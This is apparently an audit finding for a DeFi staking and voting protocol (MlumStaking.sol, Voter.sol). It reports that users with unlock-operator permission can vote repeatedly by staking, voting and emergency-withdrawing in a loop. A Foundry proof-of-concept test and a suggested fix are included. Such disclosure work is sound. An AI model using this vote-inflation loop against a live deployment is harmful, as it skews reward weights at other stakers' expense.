# Specific Users Can Vote on Pools Unlimited Number of Times potentially leading to Manipulation of Weights of the Pool

## Summary

Specific Users Can Vote on Pools Unlimited Number of Times potentially leading to Manipulation of Weights of the Pool leading to wrong calculations. 

## Vulnerability Detail

> **contracts involved: MlumStaking.sol, Voter.sol**

To Explain the Flow in Simple Steps: 

USER --> Deposits MLUM Tokens into MlumStaking.sol --> Contract Mints an NFT --> Transfers MLUM Tokens from USER to the Contract itself --> Locks out the funds in a specific Struct. 

Upon depositing the tokens and getting an NFT, the User now acheives the power to vote on a specific pool of his choice to gain rewards. The Voter.sol usually checks whether the caller is respective TokenOwner or not, and do some adequate checks like timeperiod and stuff and gives some voting power based upon his deposits in MlumStaking.sol and finally registers a mapping using the given TokenId for that epoch. 


> Where is the mistake? 

Normally, users cannot "EmergencyWithdraw" their staked Mlum tokens out of the MlumStaking.sol untill the time-period ends regardless of how much important it is. However, users with specific permission named "_unlockOperators" can "EmergencyWithdraw" their tokens regardless of the staked time-period. 

Now, users with the permission "_unlockOperator" can do the following to increases the votes substantially:
-> Deposit mlum tokens into the MlumStaking contract
-> Upon receiving an NFT Id, Vote on your specific pool on Voter.sol
-> Call "emergencyWithdraw()" on MlumStaking contract which deletes the NFT and you receive your funds back.
-> Repeat the Process 


## Impact

Thus by increasing the number of Votes for the specific Pool, Some potential issues can be occurred: 
- Being able to createFarm/AddFarm into the MasterChef - though only owner can add, it satisfies the result of minimum votes.
- When Users claim Rewards on MasterChef for the given Pool, as MasterChef calculates the weight of the pool based upon the number of votes, it can be easily manipulated by the one with "_unlockOperator" permission. 


## Code Snippet

> Add this Snippet into the Voter.t.sol: [ Give max approval to the pool to spend your mlum tokens ]

```solidity
function testUnlimitedVotes()public {
         vm.startPrank(DEV);
        _voter.startNewVotingPeriod();

        _pool.setUnlockOperator(ALICE, true);
        bool value = _pool.isUnlockOperator(ALICE);
        require(value, "Approved Address Unsuccessfull!");

         // Creating a Token For ALICE - 1st Time our TokenId = 1
        _createPosition(ALICE);

        // Pranking as ALICE
        vm.startPrank(ALICE);

        // Voting on the Pool
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());

        // Get the Total Votes of the Pool - After Voting for the First time.
        _voter.getPoolVotesPerPeriod(1, 0x95f00a7125EC3D78d6B2FCD6FFd9989941eF25fC);

        // EmergencyDestory the Token
        _pool.emergencyWithdraw(1);

        for(uint i=2; i<100; i++){

            // Creating Position Again
            _pool.createPosition(1 ether, 2 weeks);

            // Voting on the Pool - 2nd Time
            _voter.vote(i, _getDummyPools(), _getDeltaAmounts());
            
            // EmegencyDestory the Token after Voting
            _pool.emergencyWithdraw(i);
        }
        
        // Get the Total Votes of the Pool - After Voting for the First time.
        _voter.getPoolVotesPerPeriod(1, 0x95f00a7125EC3D78d6B2FCD6FFd9989941eF25fC);

    }

## Tool used

Manual Review

## Recommendation

Simple solution would be removing the userTokens from the TotalVotes of the pool, right after deleting the TokenId which will make this attack negligible.
